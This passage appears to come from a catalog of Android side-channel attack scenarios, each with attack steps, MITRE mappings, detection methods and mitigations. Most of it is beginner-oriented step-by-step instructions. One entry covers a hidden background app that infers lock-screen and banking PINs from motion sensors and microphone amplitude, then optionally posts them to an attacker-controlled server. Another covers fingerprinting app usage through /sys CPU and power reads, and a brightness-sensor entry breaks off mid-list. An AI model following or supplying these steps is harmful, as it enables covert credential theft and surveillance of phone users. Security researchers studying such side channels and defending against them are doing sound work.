Attack Steps: Beginner-Friendly Step-by-Step:1. Develop a Background Android App: – Open Android Studio. – Create a new project with no UI. – In MainActivity.java, register listeners for: • Accelerometer: Sensor.TYPE_ACCELEROMETER • Gyroscope: Sensor.TYPE_GYROSCOPE – Use SensorManager.registerListener() with a high sampling rate.2. Add Microphone Monitoring: – Use MediaRecorder to start audio capture. – Do not store full audio — just compute amplitude spikes in real-time. – Use getMaxAmplitude() to log peak tap sounds when a key is pressed.3. Log Timestamped Data: – For each tap: record accelerometer x/y/z, gyroscope x/y/z, and audio amplitude. – Save to local CSV file (or remote server if simulating a real attack).4. Collect Training Data (Safe Simulation): – On the same device, simulate entering known PINs (like 1234, 5678, 4321). – Press keys naturally while logging sensor + sound data. – Record 50–100 samples per PIN to build a dataset.5. Preprocess the Dataset: – Use Python and Pandas to read sensor CSV. – Normalize values (standard scaling). – Split each entry into time-series windows per tap.6. Train ML Model to Predict Digits: – Use TensorFlow/Keras to build an LSTM model: • Inputs: Accelerometer, gyroscope, amplitude over time. • Output: PIN digit (0–9). – Train for ~50 epochs until accuracy reaches 70–80%+.7. Run in Real-Time (Attack Simulation): – Let app run silently in background. – When user unlocks phone or enters banking PIN, log data as before. – Feed live logs into the ML model. – Predict the likely PIN sequence.8. (Optional) Exfiltrate PIN: – Use Firebase or HTTP POST to send predicted PIN to attacker-controlled server. – Or, keep it local if testing in emulator/sandbox.9. (Advanced): Combine with GUI Overlay to trigger when user is on lock screen or banking app (requires AccessibilityService or overlay permission).
Vulnerability: No permission needed for sensors, microphone inference
MITRE Technique: T1412 (Capture via Sensor), T1420 (Data Exfiltration), T1410 (Keystroke Monitoring)
Impact: Full 4–6 digit PIN inference, risk of unauthorized access
Detection Method: Monitor battery usage, unusual sensor/mic activity, anomaly in background apps
Solution: Restrict sensor access in background, limit sensor sampling, OS-level enforcement, app behavior audit
Tags: Sensor Attack, Audio Side-Channel, Motion Logger, Android PIN Skimmer

Title: App Usage Fingerprinting via CPU Frequency and Power
Scenario Description: A malicious background app continuously reads system files such as /sys/devices/system/cpu/ and /sys/class/power_supply/ to infer which app is running based on CPU frequency shifts and battery usage patterns. Apps like YouTube, WhatsApp, and Chrome create distinct CPU/power signatures that can be fingerprinted.
Tools Used: Android SDK, Custom App, adb, Python (Pandas, Scikit-learn), Logcat
Attack Steps: 1. Build a background Android app (no UI needed). 2. Request permission for reading system status (battery stats, CPU info). 3. In your Java/Kotlin code, read from: /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq /sys/class/power_supply/battery/current_now and voltage_now 4. Log this data every 1–2 seconds and write to a local file or exfiltrate. 5. Simulate known app usage (e.g., open WhatsApp for 60 sec, YouTube for 60 sec) and collect baseline data. 6. Train a machine learning classifier (e.g., Random Forest) using Pandas + Scikit-learn on this dataset. 7. Deploy trained model into app to monitor patterns in real time. 8. Based on power/CPU fingerprint, infer what app is running silently in the background. 9. Optionally send the prediction to attacker’s server.
Vulnerability: Exposed CPU/power interfaces, background monitoring allowed
MITRE Technique: T1512 (Side Channel via Device State), T1082 (System Info Discovery)
Impact: User privacy breach, profiling app behavior
Detection Method: Monitor frequent reads of /sys/, unexpected CPU polling
Solution: Restrict access to CPU/power stats, OS-level API controls, background access auditing
Tags: CPU Fingerprinting, App Inference, Android Side Channel, Power Profiling

Title: Side Channel via Screen Brightness Sensor
Scenario Description: A malicious app monitors ambient light sensors (light sensor, screen brightness changes) to infer user activity. For example, when user opens specific apps, the screen brightness auto-adjusts or is manually changed, revealing usage patterns. Attackers exploit this data to profile apps or trigger attacks.
Tools Used: Android SDK, Custom Sensor Logger App, Sensor.TYPE_LIGHT, Python (matplotlib, SciPy), Android Emulator
Attack Steps: 1. Create a background Android app using Android Studio. 2. Register the Sensor.TYPE_LIGHT and Sensor.TYPE_PROXIMITY sensors. 3. Use SensorManager to continuously monitor light changes (lux readings). 4. Log screen brightness from system settings API (Settings.System.SCREEN_BRIGHTNESS). 5. Monitor screen state (ON/OFF) using BroadcastReceiver. 6. Observe brightness pattern when opening specific apps like Chrome, Netflix, WhatsApp. 7. Label collected logs with app name and brightness values. 8. Use Python (matplotlib + SciPy) to plot time series and fingerprint each app based on its brightness behavior. 9.
